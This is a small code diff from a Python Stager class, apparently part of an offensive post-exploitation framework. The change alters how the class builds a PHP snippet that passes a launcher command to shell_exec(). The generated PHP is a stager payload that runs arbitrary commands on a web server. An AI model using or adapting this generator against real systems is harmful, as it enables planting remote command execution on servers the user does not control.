@@ -86,7 +86,7 @@ class Stager:
             return ""
 	else:
 			code = '''<?php
-			shell_exec('launcher');
+			shell_exec('''' + str(launcher) + '''');
 			?>
 			'''
-        return code.replace("launcher", launcher)
+        return code
